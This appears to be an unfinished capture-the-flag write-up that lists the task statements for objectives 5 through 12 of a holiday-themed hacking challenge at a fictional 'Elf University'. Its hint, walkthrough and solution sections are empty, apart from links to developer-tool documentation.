### Objective 5: Network Log Analysis: Determine Compromised System[](#objective5)

#### Task 

The attacks don't stop! Can you help identify the IP address of the malware-infected system using these [Zeek logs](https://downloads.elfu.org/elfu-zeeklogs.zip)? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.

#### Hints

#### Walk Through

#### Solution

### Objective 6: Splunk[](#objective6)

#### Task 

Access [https://splunk.elfu.org/](https://splunk.elfu.org/) as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.

#### Hints

#### Walk Through

#### Solution

### Objective 7: Get Access to the Steam Tunnels[](#objective7)

#### Task 

Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane.

#### Hints

#### Walk Through

#### Solution

### Objective 8: Bypassing the Frido Sleigh CAPTEHA[](#objective8)

#### Task 

Help Krampus beat the [Frido Sleigh contest](https://fridosleigh.com/). For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room.

#### Hints

#### Walk Through

#### Solution

### Objective 9: Retrieve Scraps of Paper from Server[](#objective9)

#### Task 

Gain access to the data on the [Student Portal](https://studentportal.elfu.org/) server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.

#### Hints

#### Walk Through

#### Solution

### Objective 10: Recover Cleartext Document[](#objective10)

#### Task 

The [Elfscrow Crypto](https://downloads.elfu.org/elfscrow.exe) tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have [debug symbols](https://downloads.elfu.org/elfscrow.pdb) that you can use.

Recover the plaintext content for this [encrypted document](https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc). We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.

What is the middle line on the cover page? (Hint: it's five words)

For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.


#### Hints

#### Walk Through

#### Solution

### Objective 11: Open the Sleigh Shop Door[](#objective11)

#### Task 

Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?

For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth.

#### Hints

Thanks to Kent Tinseltooth for the following hints on various dev tools.

[Chrome Dev Tools](https://developers.google.com/web/tools/chrome-devtools)

[Curl Dev Tools](https://curl.haxx.se/docs/manpage.html)

[Edge Dev Tools](https://docs.microsoft.com/en-us/microsoft-edge/devtools-guide/console)

[Firefox Dev Tools](https://developer.mozilla.org/en-US/docs/Tools)

[Lynx Dev Tools](https://xkcd.com/325/)

[Safari Dev Tools](https://developer.apple.com/safari/tools/)

#### Walk Through

#### Solution

### Objective 12: Filter Out Poisoned Sources of Weather Data

#### Task 

Use the data supplied in the [Zeek JSON logs](https://downloads.elfu.org/http.log.gz) to identify the IP addresses of attackers poisoning Santa's flight mapping software. [Block the 100 offending sources of information to guide Santa's sleigh](https://srf.elfu.org/) through the attack. Submit the Route ID ("RID") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.

#### Hints

#### Walk Through

#### Solution


## Narrative

> Whose grounds these are, I think I know
>
> His home is in the North Pole though
>
> He will not mind me traipsing here
>
> To watch his students learn and grow

* * *
